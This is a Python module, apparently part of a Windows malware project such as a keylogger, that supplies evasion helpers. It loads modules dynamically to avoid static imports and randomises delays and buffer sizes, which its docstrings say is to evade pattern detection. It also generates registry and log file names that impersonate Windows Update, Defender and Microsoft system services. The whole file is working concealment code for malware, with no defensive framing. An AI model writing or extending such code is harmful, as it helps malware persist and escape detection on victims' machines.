# ... (imports) ...
import os
import sys
import random
import time
import importlib
import types

# Dynamic Module Loading

class DynamicLoader:
    """Dynamically loads modules to avoid static imports"""
    
    _cache = {}
    
    @staticmethod
    def load_module(module_name):
        """Load module dynamically with caching"""
        if module_name in DynamicLoader._cache:
            return DynamicLoader._cache[module_name]
        
        try:
            # Try importing with importlib
            if module_name in sys.modules:
                module = sys.modules[module_name]
            else:
                module = importlib.import_module(module_name)
            
            DynamicLoader._cache[module_name] = module
            return module
        except Exception as e:
            return None
    
    @staticmethod
    def load_from_string(module_path, class_or_func_name):
        """Load class/function from module path string"""
        parts = module_path.split('.')
        module_name = '.'.join(parts[:-1]) if len(parts) > 1 else parts[0]
        
        module = DynamicLoader.load_module(module_name)
        if module:
            return getattr(module, class_or_func_name, None)
        return None

# Behavioral Polymorphism

class BehavioralPolymorph:
    """Varies behavior at runtime to evade pattern detection"""
    
    @staticmethod
    def random_delay(min_ms=0, max_ms=50):
        """Random delay to avoid consistent timing patterns"""
        # we divide on 1000.0 because the time.sleep() function takes the delay in seconds
        delay = random.uniform(min_ms / 1000.0, max_ms / 1000.0)
        time.sleep(delay)
    
    @staticmethod
    def variable_buffer_size():
        """Returns random buffer size within realistic range"""
        sizes = [300, 400, 500, 600, 750, 800, 1000]
        return random.choice(sizes)
    
    @staticmethod
    def random_interval(base_interval, variance_percent=20):
        """Varies interval time to avoid consistent patterns"""
        variance = base_interval * (variance_percent / 100.0)
        return base_interval + random.uniform(-variance, variance)
    
    @staticmethod
    def should_perform_action(probability=0.7):
        """Probabilistic action execution"""
        return random.random() < probability

# Registry Name Generator

class RegistryNameGenerator:
    """Generates polymorphic registry names"""
    
    LEGITIMATE_PREFIXES = [
        "Windows", "Microsoft", "System", "Security", "Update",
        "Configuration", "Service", "Manager", "Defender", "Network"
    ]
    
    LEGITIMATE_SUFFIXES = [
        "Update", "Service", "Manager", "Configuration", "Security",
        "System", "Defender", "Network", "Protocol", "Component"
    ]
    
    @staticmethod
    def generate_registry_name():
        """Generate random legitimate-sounding registry name"""
        # Sometimes use predefined, sometimes generate
        if random.random() < 0.5:
            predefined = [
                "Windows Security Update",
                "Microsoft System Service",
                "Windows Defender Service",
                "System Configuration Manager",
                "Windows Update Service",
                "Microsoft Security Component",
                "Windows Network Protocol",
                "System Service Manager"
            ]
            return random.choice(predefined)
        else:
            # Generate new combination
            prefix = random.choice(RegistryNameGenerator.LEGITIMATE_PREFIXES)
            suffix = random.choice(RegistryNameGenerator.LEGITIMATE_SUFFIXES)
            return f"{prefix} {suffix}"

# Filename Obfuscation

class FilenameObfuscator:
    """Generates obfuscated filenames"""
    
    @staticmethod
    def generate_log_filename():
        """Generate random but legitimate-looking log filename"""
        legitimate_names = [
            'SystemLog.dat',
            'WindowsUpdate.log',
            'SecurityAudit.dat',
            'SystemConfig.bin',
            'NetworkProtocol.dat',
            'ServiceManager.log',
            'ConfigurationCache.dat',
            'SecurityPolicy.bin'
        ]
        return random.choice(legitimate_names)

# Main Polymorphic Context

class PolymorphicContext:
    """Main context manager for polymorphic operations"""
    
    def __init__(self):
        self.dynamic_loader = DynamicLoader()
        self.behavioral = BehavioralPolymorph()
        self.registry_generator = RegistryNameGenerator()
        self.filename_obfuscator = FilenameObfuscator()
        
        # Runtime configuration
        self.buffer_size = self.behavioral.variable_buffer_size()
    
    def add_random_delay(self, min_ms=0, max_ms=100):
        """Add random delay with optional custom bounds"""
        self.behavioral.random_delay(min_ms, max_ms)
    
    def get_registry_name(self):
        """Get polymorphic registry name"""
        return self.registry_generator.generate_registry_name()
    
    def get_log_filename(self):
        """Get polymorphic log filename"""
        return self.filename_obfuscator.generate_log_filename()
    
    def mutate_config(self):
        """Randomly mutate configuration"""
        self.buffer_size = self.behavioral.variable_buffer_size()


# Global polymorphic context instance
_poly_ctx = None

def get_polymorphic_context():
    """Get or create global polymorphic context"""
    global _poly_ctx
    if _poly_ctx is None:
        _poly_ctx = PolymorphicContext()
    return _poly_ctx
